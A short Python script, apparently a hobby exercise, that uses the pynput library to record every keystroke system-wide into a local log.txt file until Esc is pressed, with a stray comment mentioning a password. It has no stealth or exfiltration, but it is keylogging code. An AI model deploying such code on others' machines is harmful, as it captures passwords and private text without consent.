from pynput.keyboard import Key, Listener
count = 0
keys = []
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{} pressed".format(key))

    if count > 0:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    """

    :param keys: What should be written to the file
    :return: created file
    """
    with open("log.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'","")
            if str(key) == "Key.space":
                file.write('\n')
            elif k.find("Key") == -1:
                file.write(str(k))

# heeey hi whats up    parolata mi e qq
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
